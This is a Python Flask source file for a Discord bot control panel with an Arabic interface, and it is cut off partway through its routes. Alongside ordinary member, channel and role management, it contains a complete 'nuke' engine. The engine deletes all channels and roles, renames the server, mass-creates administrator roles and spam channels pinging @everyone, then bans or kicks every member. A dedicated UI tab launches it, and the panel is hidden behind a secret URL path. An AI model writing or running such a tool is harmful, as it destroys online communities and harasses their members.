# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════╗
║   5sz8-UltraCtrl — Standalone Bot Control Panel     ║
║   Deploy on Railway / Render / any Python host      ║
║   Env vars: BOT_TOKEN, PANEL_PASS, PORT             ║
╚══════════════════════════════════════════════════════╝
"""

from flask import (Flask, render_template_string, request,
                   redirect, session, jsonify)
import requests, os, json, datetime, threading, time, secrets, hashlib

# ─────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("BOT_TOKEN",  "")
PANEL_PASS  = os.environ.get("PANEL_PASS", "")
PORT        = int(os.environ.get("PORT",   8080))
DISCORD_API = "https://discord.com/api/v10"
CDN         = "https://cdn.discordapp.com"

# Secret URL base path — change SECRET_SEG env var if you want a custom one
SECRET_SEG  = os.environ.get("SECRET_SEG", "vc4n8zq2k0")
BASE        = f"/5sz8-{SECRET_SEG}"   # e.g.  /5sz8-vc4n8zq2k0/

# ─────────────────────────────────────────────────────────────
#  FLASK APP
# ─────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = hashlib.sha256((PANEL_PASS + "5sz8secret").encode()).hexdigest()
app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(hours=12)

# ─────────────────────────────────────────────────────────────
#  NUKE TASKS  (background threads — key = guild_id)
# ─────────────────────────────────────────────────────────────
nuke_tasks: dict = {}   # gid → {"status": "running"|"done"|"error", "log": [...]}

# ─────────────────────────────────────────────────────────────
#  DISCORD REST HELPERS
# ─────────────────────────────────────────────────────────────
def dc(method, path, **kwargs):
    """Call Discord REST API with the bot token."""
    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type":  "application/json",
        **(kwargs.pop("extra_headers", {}))
    }
    try:
        r = requests.request(method, f"{DISCORD_API}{path}",
                             headers=headers, timeout=10, **kwargs)
        return r
    except Exception as e:
        return None

def dc_get(path, **kw):   return dc("GET",    path, **kw)
def dc_post(path, **kw):  return dc("POST",   path, **kw)
def dc_patch(path, **kw): return dc("PATCH",  path, **kw)
def dc_del(path, **kw):   return dc("DELETE", path, **kw)

def get_guilds():
    r = dc_get("/users/@me/guilds")
    return r.json() if r and r.ok else []

def get_guild(gid):
    r = dc_get(f"/guilds/{gid}?with_counts=true")
    return r.json() if r and r.ok else {}

def get_members(gid, limit=1000):
    r = dc_get(f"/guilds/{gid}/members?limit={limit}")
    return r.json() if r and r.ok else []

def get_channels(gid):
    r = dc_get(f"/guilds/{gid}/channels")
    return r.json() if r and r.ok else []

def get_roles(gid):
    r = dc_get(f"/guilds/{gid}/roles")
    return r.json() if r and r.ok else []

def guild_icon_url(gid, icon_hash):
    if not icon_hash: return None
    return f"{CDN}/icons/{gid}/{icon_hash}.webp?size=64"

def user_avatar_url(uid, avatar_hash):
    if not avatar_hash: return None
    return f"{CDN}/avatars/{uid}/{avatar_hash}.webp?size=32"

# ─────────────────────────────────────────────────────────────
#  AUTH DECORATOR
# ─────────────────────────────────────────────────────────────
from functools import wraps
def require_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("auth"):
            return redirect(f"{BASE}/login")
        return f(*args, **kwargs)
    return decorated

# ─────────────────────────────────────────────────────────────
#  NUKE ENGINE  (runs in a background thread)
# ─────────────────────────────────────────────────────────────
def _nuke_thread(gid, channels, roles, new_name, spam_msg, spam_count, delay, ban_all, kick_all):
    log = nuke_tasks[gid]["log"]

    def log_add(msg):
        log.append(f"[{datetime.datetime.utcnow().strftime('%H:%M:%S')}] {msg}")

    log_add(f"🚀 بدأ النيوك — {new_name}")

    # Phase 1: Delete channels
    chs = dc_get(f"/guilds/{gid}/channels")
    if chs and chs.ok:
        for ch in chs.json():
            dc_del(f"/channels/{ch['id']}")
            log_add(f"🗑️ حذف روم {ch['name']}")
            time.sleep(delay)

    # Phase 2: Delete roles
    rls = dc_get(f"/guilds/{gid}/roles")
    if rls and rls.ok:
        for r in rls.json():
            if r["name"] == "@everyone" or r.get("managed"):
                continue
            dc_del(f"/guilds/{gid}/roles/{r['id']}")
            log_add(f"🏅 حذف رتبة {r['name']}")
            time.sleep(delay)

    # Rename server
    dc_patch(f"/guilds/{gid}", json={"name": new_name})
    log_add(f"✏️ تغيير الاسم → {new_name}")

    # Phase 3: Create roles
    for i in range(min(roles, 500)):
        r = dc_post(f"/guilds/{gid}/roles",
                    json={"name": f"5sz8-r{i+1}", "color": 0xFF0000, "permissions": "8"})
        if r and r.ok:
            log_add(f"👑 إنشاء رتبة #{i+1}")
        time.sleep(delay)

    # Phase 4: Create channels + spam
    for i in range(min(channels, 500)):
        r = dc_post(f"/guilds/{gid}/channels",
                    json={"name": f"nuked-{i+1}", "type": 0})
        if r and r.ok:
            ch_id = r.json()["id"]
            log_add(f"📢 إنشاء روم #{i+1}")
            for _ in range(min(spam_count, 30)):
                dc_post(f"/channels/{ch_id}/messages", json={"content": spam_msg})
                time.sleep(delay)
        time.sleep(delay)

    # Phase 5: Ban / Kick
    members = dc_get(f"/guilds/{gid}/members?limit=1000")
    if members and members.ok:
        for m in members.json():
            uid = m["user"]["id"]
            if m["user"].get("bot"):
                continue
            if ban_all:
                dc_post(f"/guilds/{gid}/bans/{uid}", json={"delete_message_seconds": 604800})
                log_add(f"🔨 بان {m['user']['username']}")
            elif kick_all:
                dc_del(f"/guilds/{gid}/members/{uid}")
                log_add(f"💢 كيك {m['user']['username']}")
            time.sleep(delay)

    log_add("✅ اكتمل النيوك")
    nuke_tasks[gid]["status"] = "done"

# ─────────────────────────────────────────────────────────────
#  HTML TEMPLATES
# ─────────────────────────────────────────────────────────────
_CSS = """
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--bg2:#111118;--bg3:#1a1a24;--border:#222233;--accent:#5865f2;
  --green:#57f287;--red:#ed4245;--yellow:#fee75c;--text:#e0e0f0;--muted:#666688}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Tahoma,sans-serif;min-height:100vh}
a{color:inherit;text-decoration:none}
.topbar{background:var(--bg2);padding:13px 26px;display:flex;align-items:center;
  justify-content:space-between;border-bottom:2px solid var(--accent);position:sticky;top:0;z-index:10}
.topbar h1{font-size:16px;color:#fff;font-weight:700}
.nav a{color:var(--muted);font-size:13px;margin-right:12px;padding:5px 13px;
  border-radius:6px;border:1px solid var(--border);transition:.15s}
.nav a:hover,.nav a.active{background:var(--accent);color:#fff;border-color:var(--accent)}
.wrap{max-width:1200px;margin:26px auto;padding:0 16px}
.sec{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:18px}
.sec h2{font-size:14px;color:#fff;margin-bottom:14px;padding-bottom:9px;border-bottom:1px solid var(--border)}
.btn{padding:6px 14px;border-radius:6px;border:none;cursor:pointer;font-size:12px;
  font-weight:600;transition:.15s;display:inline-block;text-align:center}
.b-bl{background:var(--accent);color:#fff}.b-bl:hover{background:#4752c4}
.b-r{background:#ed424518;color:var(--red);border:1px solid #ed424533}.b-r:hover{background:var(--red);color:#fff}
.b-y{background:#fee75c22;color:var(--yellow);border:1px solid #fee75c44}.b-y:hover{background:var(--yellow);color:#000}
.b-g{background:#57f28718;color:var(--green);border:1px solid #57f28733}.b-g:hover{background:var(--green);color:#000}
input,select,textarea{background:var(--bg);border:1px solid var(--border);color:var(--text);
  padding:8px 12px;border-radius:7px;font-size:13px;outline:none;font-family:inherit}
input:focus,select:focus,textarea:focus{border-color:var(--accent)}
textarea{width:100%;resize:vertical;min-height:70px}
table{width:100%;border-collapse:collapse}
th{text-align:right;color:var(--muted);font-size:11px;padding:6px 10px;border-bottom:1px solid var(--border)}
td{padding:8px 10px;border-bottom:1px solid #14141e;font-size:13px;vertical-align:middle}
tr:last-child td{border:none}
code{background:#1e1e2e;padding:2px 6px;border-radius:4px;font-size:11px;color:#a8b4fc}
.rf{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;align-items:center}
.alert{padding:10px 14px;border-radius:7px;font-size:13px;margin-bottom:14px}
.alert-ok{background:#57f28718;color:var(--green);border:1px solid #57f28733}
.alert-err{background:#ed424518;color:var(--red);border:1px solid #ed424533}
.tabs{display:flex;gap:4px;margin-bottom:18px;flex-wrap:wrap}
.tab{padding:8px 18px;border-radius:8px;cursor:pointer;font-size:13px;font-weight:600;
  background:var(--bg3);border:1px solid var(--border);color:var(--muted);transition:.15s}
.tab.active,.tab:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
.panel{display:none}.panel.active{display:block}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:18px}
.stat-box{background:var(--bg3);border:1px solid var(--border);border-radius:10px;
  padding:16px;text-align:center}
.stat-box .n{font-size:22px;font-weight:700;color:var(--accent)}
.stat-box .l{color:var(--muted);font-size:11px;margin-top:3px}
.badge{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:600;display:inline-block}
.badge-bot{background:#5865f222;color:#5865f2;border:1px solid #5865f244}
.badge-own{background:#f0b13222;color:#f0b132;border:1px solid #f0b13244}
.scard{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:18px;
  display:flex;flex-direction:column;gap:10px;transition:.2s}
.scard:hover{border-color:var(--accent);transform:translateY(-2px)}
.sgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:14px}
.sicon{width:50px;height:50px;border-radius:50%;background:var(--bg3);
  display:flex;align-items:center;justify-content:center;font-size:20px;overflow:hidden;flex-shrink:0}
.sicon img{width:100%;height:100%;border-radius:50%;object-fit:cover}
.nuke-box{background:#ed424510;border:1px solid #ed424540;border-radius:12px;padding:22px}
.nuke-box h2{color:var(--red);margin-bottom:14px}
.log-box{background:#0a0a0f;border:1px solid var(--border);border-radius:8px;
  padding:12px;max-height:320px;overflow-y:auto;font-family:monospace;font-size:12px;line-height:1.7}
.log-box .e{color:#57f287}.log-box .x{color:#ed4245}.log-box .i{color:#a8b4fc}
@media(max-width:600px){.grid2{grid-template-columns:1fr}}
"""

LOGIN_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>5sz8 Ultra Control</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0f0;font-family:'Segoe UI',sans-serif;
  display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#111118;border:1px solid #222233;border-radius:18px;padding:44px;
  width:100%;max-width:360px;text-align:center}
.box h1{font-size:22px;color:#fff;margin-bottom:6px}
.box p{color:#666688;font-size:13px;margin-bottom:28px}
input{width:100%;background:#0a0a0f;border:1px solid #222233;color:#e0e0f0;
  padding:12px 16px;border-radius:9px;font-size:14px;margin-bottom:14px;outline:none;
  font-family:inherit;letter-spacing:1px}
input:focus{border-color:#5865f2}
button{width:100%;background:#5865f2;color:#fff;border:none;padding:12px;
  border-radius:9px;font-size:14px;cursor:pointer;font-weight:700;transition:.15s}
button:hover{background:#4752c4}
.err{color:#ed4245;background:#ed424514;border:1px solid #ed424530;
  padding:8px 12px;border-radius:7px;font-size:12px;margin-bottom:14px}
</style></head>
<body>
<div class="box">
  <h1>💀 5sz8 Ultra Control</h1>
  <p>Bot Management Dashboard</p>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="password" name="password" placeholder="كلمة المرور" autofocus>
    <button type="submit">دخول</button>
  </form>
</div>
</body></html>"""

DASH_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>5sz8 Ultra Control</title>
<style>""" + _CSS + """</style></head>
<body>
<div class="topbar">
  <h1>💀 5sz8 Ultra Control</h1>
  <div class="nav">
    <a href="{{ base }}/" class="active">الرئيسية</a>
    <a href="{{ base }}/servers">السيرفرات</a>
    <a href="{{ base }}/logout">خروج</a>
  </div>
</div>
<div class="wrap">
  <div class="grid3">
    <div class="stat-box"><div class="n">{{ guilds|length }}</div><div class="l">السيرفرات</div></div>
    <div class="stat-box"><div class="n">{{ total_members }}</div><div class="l">الأعضاء الكلي</div></div>
    <div class="stat-box"><div class="n">{{ bot_name }}</div><div class="l">اسم البوت</div></div>
    <div class="stat-box"><div class="n">{{ bot_id }}</div><div class="l">معرف البوت</div></div>
  </div>

  <div class="sec">
    <h2>🌐 السيرفرات الأخيرة</h2>
    <table>
      <thead><tr><th>السيرفر</th><th>الأعضاء</th><th>المعرف</th><th>إدارة</th></tr></thead>
      <tbody>
      {% for g in guilds[:10] %}
      <tr>
        <td>
          {% if g.icon %}<img src="{{ g.icon_url }}" style="width:26px;height:26px;border-radius:50%;vertical-align:middle;margin-left:8px">{% endif %}
          <strong>{{ g.name }}</strong>
        </td>
        <td>{{ g.approximate_member_count or '?' }}</td>
        <td><code>{{ g.id }}</code></td>
        <td><a href="{{ base }}/server/{{ g.id }}" class="btn b-bl">إدارة</a></td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </div>

  <div class="sec">
    <h2>ℹ️ معلومات الاتصال</h2>
    <p style="color:var(--muted);font-size:13px">البوت: <strong style="color:#fff">{{ bot_name }}</strong>
    — معرف: <code>{{ bot_id }}</code>
    — نوع التحقق: <code>Bot Token</code></p>
  </div>
</div>
</body></html>"""

SERVERS_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>السيرفرات — 5sz8 Ultra</title>
<style>""" + _CSS + """</style></head>
<body>
<div class="topbar">
  <h1>💀 5sz8 Ultra Control</h1>
  <div class="nav">
    <a href="{{ base }}/">الرئيسية</a>
    <a href="{{ base }}/servers" class="active">السيرفرات</a>
    <a href="{{ base }}/logout">خروج</a>
  </div>
</div>
<div class="wrap">
  <h2 style="margin-bottom:16px">🌐 السيرفرات ({{ guilds|length }})</h2>
  <input id="srch" placeholder="بحث..." oninput="filter()" style="margin-bottom:16px;width:280px">
  <div class="sgrid" id="grid">
    {% for g in guilds %}
    <div class="scard" data-n="{{ g.name|lower }}">
      <div style="display:flex;gap:12px;align-items:center">
        <div class="sicon">
          {% if g.icon %}<img src="{{ g.icon_url }}" alt="">{% else %}🌐{% endif %}
        </div>
        <div>
          <div style="font-weight:700;color:#fff;font-size:14px">{{ g.name }}</div>
          <code style="font-size:10px">{{ g.id }}</code>
        </div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <span style="font-size:11px;color:var(--muted)">👥 {{ g.approximate_member_count or '?' }}</span>
      </div>
      <div style="display:flex;gap:8px">
        <a href="{{ base }}/server/{{ g.id }}" class="btn b-bl" style="flex:1;text-align:center">⚙️ إدارة</a>
        <a href="{{ base }}/server/{{ g.id }}?tab=nuke" class="btn b-r" style="flex:1;text-align:center">💀 نيوك</a>
      </div>
    </div>
    {% endfor %}
  </div>
</div>
<script>
function filter(){const q=document.getElementById('srch').value.toLowerCase();
  document.querySelectorAll('.scard').forEach(c=>{c.style.display=c.dataset.n.includes(q)?'':'none'});}
</script>
</body></html>"""

SERVER_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ gname }} — 5sz8 Ultra</title>
<style>""" + _CSS + """</style></head>
<body>
<div class="topbar">
  <h1>💀 {{ gname }}</h1>
  <div class="nav">
    <a href="{{ base }}/">الرئيسية</a>
    <a href="{{ base }}/servers">السيرفرات</a>
    <a href="{{ base }}/logout">خروج</a>
  </div>
</div>
<div class="wrap">

  {% if flash %}
  <div class="alert {% if flash_ok %}alert-ok{% else %}alert-err{% endif %}">{{ flash }}</div>
  {% endif %}

  <div class="grid3">
    <div class="stat-box"><div class="n">{{ members|length }}</div><div class="l">الأعضاء</div></div>
    <div class="stat-box"><div class="n">{{ channels|length }}</div><div class="l">الرومات</div></div>
    <div class="stat-box"><div class="n">{{ roles|length }}</div><div class="l">الرتب</div></div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="sw('members',this)">👥 الأعضاء</div>
    <div class="tab" onclick="sw('channels',this)">💬 الرومات</div>
    <div class="tab" onclick="sw('roles',this)">🏅 الرتب</div>
    <div class="tab" onclick="sw('actions',this)">⚙️ إجراءات</div>
    <div class="tab" onclick="sw('nuke',this)" style="color:#f87171">💀 نيوك</div>
  </div>

  <!-- MEMBERS -->
  <div id="tab-members" class="panel active">
    <div class="sec">
      <h2>👥 الأعضاء</h2>
      <div class="rf">
        <input id="msrch" placeholder="بحث..." oninput="filterRows('mtbl','msrch')" style="flex:1">
      </div>
      <table id="mtbl">
        <thead><tr><th>المستخدم</th><th>المعرف</th><th>إجراءات</th></tr></thead>
        <tbody>
        {% for m in members %}
        {% set u = m.user %}
        <tr data-n="{{ u.username|lower }} {{ u.id }}">
          <td>
            {% if u.avatar %}<img src="{{ avatar_url(u.id, u.avatar) }}" style="width:24px;height:24px;border-radius:50%;vertical-align:middle;margin-left:6px">{% endif %}
            <strong>{{ m.nick or u.username }}</strong>
            {% if u.bot %}<span class="badge badge-bot">🤖</span>{% endif %}
          </td>
          <td><code>{{ u.id }}</code></td>
          <td>
            {% if not u.bot %}
            <form method="POST" action="{{ base }}/server/{{ gid }}/ban" style="display:inline">
              <input type="hidden" name="uid" value="{{ u.id }}">
              <button class="btn b-r">بان</button>
            </form>
            <form method="POST" action="{{ base }}/server/{{ gid }}/kick" style="display:inline">
              <input type="hidden" name="uid" value="{{ u.id }}">
              <button class="btn b-y">كيك</button>
            </form>
            {% endif %}
          </td>
        </tr>
        {% endfor %}
        </tbody>
      </table>
    </div>
    <div class="sec">
      <h2>⛔ بان بالمعرف</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/ban" class="rf">
        <input name="uid" placeholder="User ID" required>
        <input name="reason" placeholder="السبب">
        <button class="btn b-r">⛔ بان</button>
      </form>
    </div>
  </div>

  <!-- CHANNELS -->
  <div id="tab-channels" class="panel">
    <div class="sec">
      <h2>💬 الرومات النصية</h2>
      <table>
        <thead><tr><th>الاسم</th><th>المعرف</th><th>إرسال رسالة</th><th>حذف</th></tr></thead>
        <tbody>
        {% for ch in channels if ch.type == 0 %}
        <tr>
          <td>#{{ ch.name }}</td>
          <td><code>{{ ch.id }}</code></td>
          <td>
            <form method="POST" action="{{ base }}/server/{{ gid }}/send" style="display:flex;gap:6px">
              <input type="hidden" name="channel_id" value="{{ ch.id }}">
              <input name="content" placeholder="الرسالة..." required style="width:180px">
              <button class="btn b-g">إرسال</button>
            </form>
          </td>
          <td>
            <form method="POST" action="{{ base }}/server/{{ gid }}/delete-channel" style="display:inline"
                  onsubmit="return confirm('حذف #{{ ch.name }}؟')">
              <input type="hidden" name="channel_id" value="{{ ch.id }}">
              <button class="btn b-r">حذف</button>
            </form>
          </td>
        </tr>
        {% endfor %}
        </tbody>
      </table>
    </div>
    <div class="sec">
      <h2>➕ إنشاء روم</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/create-channel" class="rf">
        <input name="name" placeholder="اسم الروم" required>
        <select name="type">
          <option value="0">📝 نصي</option>
          <option value="2">🔊 صوتي</option>
        </select>
        <button class="btn b-bl">إنشاء</button>
      </form>
    </div>
  </div>

  <!-- ROLES -->
  <div id="tab-roles" class="panel">
    <div class="sec">
      <h2>🏅 الرتب</h2>
      <table>
        <thead><tr><th>الاسم</th><th>اللون</th><th>المعرف</th><th>حذف</th></tr></thead>
        <tbody>
        {% for r in roles if r.name != '@everyone' and not r.managed %}
        <tr>
          <td>
            <span style="display:inline-block;width:10px;height:10px;border-radius:50%;
              background:#{{ '%06x'|format(r.color) if r.color else '888888' }};margin-left:6px"></span>
            {{ r.name }}
          </td>
          <td><code>#{{ '%06x'|format(r.color) if r.color else '000000' }}</code></td>
          <td><code>{{ r.id }}</code></td>
          <td>
            <form method="POST" action="{{ base }}/server/{{ gid }}/delete-role" style="display:inline"
                  onsubmit="return confirm('حذف {{ r.name }}؟')">
              <input type="hidden" name="role_id" value="{{ r.id }}">
              <button class="btn b-r">حذف</button>
            </form>
          </td>
        </tr>
        {% endfor %}
        </tbody>
      </table>
    </div>
    <div class="sec">
      <h2>➕ إنشاء رتبة</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/create-role" class="rf">
        <input name="name" placeholder="اسم الرتبة" required>
        <input name="color" placeholder="#hex اللون" style="width:130px">
        <button class="btn b-bl">إنشاء</button>
      </form>
    </div>
  </div>

  <!-- ACTIONS -->
  <div id="tab-actions" class="panel">
    <div class="sec">
      <h2>✏️ تغيير اسم السيرفر</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/rename" class="rf">
        <input name="name" placeholder="الاسم الجديد" required>
        <button class="btn b-bl">تغيير</button>
      </form>
    </div>
    <div class="sec">
      <h2>📢 بث رسالة لكل الرومات</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/broadcast">
        <textarea name="content" placeholder="الرسالة..."></textarea>
        <button class="btn b-bl" style="margin-top:8px">📢 بث</button>
      </form>
    </div>
    <div class="sec">
      <h2>🚪 مغادرة السيرفر</h2>
      <form method="POST" action="{{ base }}/server/{{ gid }}/leave"
            onsubmit="return confirm('تأكيد مغادرة {{ gname }}؟')">
        <button class="btn b-r">🚪 مغادرة</button>
      </form>
    </div>
  </div>

  <!-- NUKE -->
  <div id="tab-nuke" class="panel">
    <div class="nuke-box">
      <h2>💀 نيوك {{ gname }}</h2>
      <p style="color:var(--muted);font-size:13px;margin-bottom:18px">⚠️ هذا الإجراء لا رجعة فيه</p>
      {% if nuke_status %}
      <div style="margin-bottom:18px">
        <p style="font-size:13px;color:{% if nuke_status=='running' %}var(--yellow){% elif nuke_status=='done' %}var(--green){% else %}var(--red){% endif %}">
          حالة النيوك: <strong>{{ nuke_status }}</strong>
        </p>
        <a href="{{ base }}/server/{{ gid }}/nuke-log" class="btn b-bl" style="margin-top:8px;display:inline-block">
          📋 عرض السجل
        </a>
      </div>
      {% endif %}
      <form method="POST" action="{{ base }}/server/{{ gid }}/nuke"
            onsubmit="return confirm('متأكد تريد نيوك {{ gname }}؟')">
        <div class="grid2">
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">عدد الرومات</label>
            <input type="number" name="channels" value="500" min="1" max="1000000" style="width:100%">
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">عدد الرتب</label>
            <input type="number" name="roles" value="500" min="1" max="1000000" style="width:100%">
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">الاسم الجديد</label>
            <input type="text" name="new_name" value="5sz8-NUKED" style="width:100%">
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">التأخير (ثانية)</label>
            <input type="number" name="delay" value="0.05" step="0.01" min="0.01" max="2" style="width:100%">
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">رسالة السبام</label>
            <input type="text" name="spam_msg" value="@everyone 💀 5sz8 NUKED" style="width:100%">
          </div>
          <div>
            <label style="font-size:11px;color:var(--muted);display:block;margin-bottom:4px">عدد السبام لكل روم</label>
            <input type="number" name="spam_count" value="10" min="1" style="width:100%">
          </div>
        </div>
        <div style="display:flex;gap:20px;margin-top:14px">
          <label><input type="checkbox" name="ban_all" value="1" checked> بان الكل</label>
          <label><input type="checkbox" name="kick_all" value="1"> كيك الكل</label>
        </div>
        <button class="btn b-r" style="margin-top:18px;padding:10px 30px;font-size:14px">
          💀 تنفيذ النيوك
        </button>
      </form>
    </div>
  </div>

</div>
<script>
function sw(name, el){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.getElementById('tab-'+name).classList.add('active');
  el.classList.add('active');
}
function filterRows(tid,iid){
  const q=document.getElementById(iid).value.toLowerCase();
  document.querySelectorAll('#'+tid+' tbody tr').forEach(r=>{
    r.style.display=r.dataset.n&&r.dataset.n.includes(q)?'':(!q?'':'none');
  });
}
const activeTab = "{{ active_tab }}";
if(activeTab){
  const tabs={'members':0,'channels':1,'roles':2,'actions':3,'nuke':4};
  const idx=tabs[activeTab]??0;
  const allTabs=document.querySelectorAll('.tab');
  if(allTabs[idx]) sw(activeTab, allTabs[idx]);
}
</script>
</body></html>"""

NUKE_LOG_HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>سجل النيوك — 5sz8</title>
<style>""" + _CSS + """
body{padding:24px}
</style>
<meta http-equiv="refresh" content="3">
</head>
<body>
<div style="max-width:800px;margin:0 auto">
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
    <h1 style="font-size:18px">💀 سجل النيوك — {{ gid }}</h1>
    <div>
      <span style="font-size:13px;color:{% if status=='running' %}#fee75c{% elif status=='done' %}#57f287{% else %}#ed4245{% endif %}">
        ● {{ status }}
      </span>
      <a href="{{ base }}/server/{{ gid }}?tab=nuke" class="btn b-bl" style="margin-right:10px">← رجوع</a>
    </div>
  </div>
  <div class="log-box">
    {% for line in log %}
    <div class="{% if '✅' in line %}e{% elif '❌' in line or 'خطأ' in line %}x{% else %}i{% endif %}">{{ line }}</div>
    {% else %}
    <div style="color:#444">لا يوجد سجل بعد...</div>
    {% endfor %}
  </div>
  <p style="color:#555;font-size:11px;margin-top:8px">يتجدد تلقائياً كل 3 ثوان</p>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────
#  ROUTES — AUTH
# ─────────────────────────────────────────────────────────────
@app.route(f"{BASE}/login", methods=["GET", "POST"])
@app.route(f"{BASE}/", methods=["GET", "POST"])
def login():
    if session.get("auth"):
        return redirect(f"{BASE}/dashboard")
    error = None
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if hashlib.sha256(pwd.encode()).hexdigest() == hashlib.sha256(PANEL_PASS.encode()).hexdigest():
            session.permanent = True
            session["auth"] = True
            return redirect(f"{BASE}/dashboard")
        error = "❌ كلمة المرور خاطئة"
    return render_template_string(LOGIN_HTML, error=error)

@app.route(f"{BASE}/logout")
def logout():
    session.clear()
    return redirect(f"{BASE}/login")

# ─────────────────────────────────────────────────────────────
#  ROUTES — DASHBOARD
# ─────────────────────────────────────────────────────────────
@app.route(f"{BASE}/dashboard")
@require_login
def dashboard():
    guilds_raw = get_guilds()
    bot_info   = dc_get("/users/@me")
    bot_info   = bot_info.json() if bot_info and bot_info.ok else {}
    guilds = []
    total_members = 0
    for g in guilds_raw:
        g["icon_url"] = guild_icon_url(g["id"], g.get("icon"))
        total_members += g.get("approximate_member_count", 0)
        guilds.append(type("G", (), g)())
    return render_template_string(DASH_HTML,
        base=BASE, guilds=guilds,
        total_members=total_members,
        bot_name=bot_info.get("username", "Unknown"),
        bot_id=bot_info.get("id", "?"))

# ─────────────────────────────────────────────────────────────
#  ROUTES — SERVERS
# ─────────────────────────────────────────────────────────────
@app.route(f"{BASE}/servers")
@require_login
def servers():
    guilds_raw = get_guilds()
    guilds = []
    for g in sorted(guilds_raw, key=lambda x: x.get("approximate_member_count", 0), reverse=True):
        g["icon_url"] = guild_icon_url(g["id"], g.get("icon"))
        guilds.append(type("G", (), g)())
    return render_template_string(SERVERS_HTML, base=BASE, guilds=guilds)

# ─────────────────────────────────────────────────────────────
#  ROUTES — SERVER DETAIL
# ─────────────────────────────────────────────────────────────
@app.route(f"{BASE}/server/<gid>")
@require_login
def server_view(gid):
    guild    = get_guild(gid)
    members  = get_members(gid)
    channels = sorted(get_channels(gid), key=lambda c: c.get("position", 0))
    roles    = sorted(get_roles(gid),    key=lambda r: r.get("position", 0), reverse=True)

    members_objs  = [type("M", (), m)() for m in members]
    channels_objs = [type("C", (), c)() for c in channels]
    roles_objs    = [type("R", (), r)() for r in roles]

    flash      = session.pop("flash",    None)
    flash_ok   = session.pop("flash_ok", True)
    active_tab = request.args.get("tab", session.pop("active_tab", "members"))

    nuke_status = nuke_tasks.get(gid, {}).get("status")

    return render_template_string(SERVER_HTML,
        base=BASE, gid=gid,
        gname=guild.get("name", gid),
        members=members_objs,
        channels=channels_objs,
        roles=roles_objs,
        flash=flash, flash_ok=flash_ok,
        active_tab=active_tab,
        nuke_status=nuke_status,
        avatar_url=user_avatar_url)

# ─────────────────────────────────────────────────────────────
#  ROUTES — SERVER ACTIONS
# ─────────────────────────────────────────────────────────────
def _flash(gid, msg, ok=True, tab="members"):
    session["flash"]      = msg
    session["flash_ok"]   = ok
    session["active_tab"] = tab
    return redirect(f"{BASE}/server/{gid}")

@app.route(f"{BASE}/server/<gid>/ban", methods=["POST"])
@require_login
def srv_ban(gid):
    uid    = request.form.get("uid", "").strip()
    reason = request.form.get("reason", "Banned via 5sz8 Panel")
    if uid:
        r = dc_post(f"/guilds/{gid}/bans/{uid}",
                    json={"delete_message_seconds": 604800},
                    extra_headers={"X-Audit-Log-Reason": reason})
        ok = r and r.ok
        return _flash(gid, f"✅ تم بان {uid}" if ok else f"❌ فشل البان ({r.status_code if r else 'no response'})", ok)
    return _flash(gid, "❌ معرف مفقود", False)

@app.route(f"{BASE}/server/<gid>/kick", methods=["POST"])
@require_login
def srv_kick(gid):
    uid = request.form.get("uid", "").strip()
    if uid:
        r  = dc_del(f"/guilds/{gid}/members/{uid}")
        ok = r and r.ok
        return _flash(gid, f"✅ تم كيك {uid}" if ok else f"❌ فشل الكيك ({r.status_code if r else ''})", ok)
    return _flash(gid, "❌ معرف مفقود", False)

@app.route(f"{BASE}/server/<gid>/send", methods=["POST"])
@require_login
def srv_send(gid):
